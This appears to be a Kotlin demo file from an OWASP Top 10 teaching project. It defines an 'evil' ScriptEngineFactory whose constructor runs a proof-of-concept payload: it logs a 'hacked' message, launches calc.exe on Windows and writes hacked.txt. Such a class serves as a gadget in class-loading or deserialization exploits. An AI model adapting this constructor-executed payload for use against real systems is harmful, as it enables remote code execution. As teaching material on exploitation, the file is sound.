package cz.bedla.owasptop10.evil

import org.slf4j.LoggerFactory
import java.nio.file.Files
import java.nio.file.Path
import javax.script.ScriptEngine
import javax.script.ScriptEngineFactory

class EvilScriptEngineFactory : ScriptEngineFactory {
    init {
        logger.info("*** Now you are hacked! ***")
        if (System.getProperty("os.name").contains("windows", ignoreCase = true)) {
            Runtime.getRuntime().exec(arrayOf("calc.exe"));
        }

        Files.writeString(Path.of(".", "hacked.txt"), "Now you are hacked!")
    }

    override fun getEngineName(): String {
        TODO("Not yet implemented")
    }

    override fun getEngineVersion(): String {
        TODO("Not yet implemented")
    }

    override fun getExtensions(): MutableList<String> {
        TODO("Not yet implemented")
    }

    override fun getMimeTypes(): MutableList<String> {
        TODO("Not yet implemented")
    }

    override fun getNames(): MutableList<String> {
        TODO("Not yet implemented")
    }

    override fun getLanguageName(): String {
        TODO("Not yet implemented")
    }

    override fun getLanguageVersion(): String {
        TODO("Not yet implemented")
    }

    override fun getParameter(key: String?): Any {
        TODO("Not yet implemented")
    }

    override fun getMethodCallSyntax(obj: String?, m: String?, vararg args: String?): String {
        TODO("Not yet implemented")
    }

    override fun getOutputStatement(toDisplay: String?): String {
        TODO("Not yet implemented")
    }

    override fun getProgram(vararg statements: String?): String {
        TODO("Not yet implemented")
    }

    override fun getScriptEngine(): ScriptEngine {
        TODO("Not yet implemented")
    }

    companion object {
        private val logger = LoggerFactory.getLogger(EvilScriptEngineFactory::class.java)!!
    }
}